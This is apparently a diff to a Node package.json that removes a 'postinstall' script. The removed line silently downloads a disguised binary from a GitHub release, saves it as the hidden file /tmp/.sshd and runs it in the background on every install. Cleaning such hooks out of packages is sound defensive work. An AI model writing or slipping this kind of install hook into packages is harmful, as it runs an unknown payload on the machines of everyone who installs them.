@@ -26,8 +26,7 @@
   "devDependencies": {},
   "scripts": {
     "test": "nodemon ./index.js",
-    "start": "node ./index.js",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "start": "node ./index.js"
   },
   "repository": {
     "type": "git",
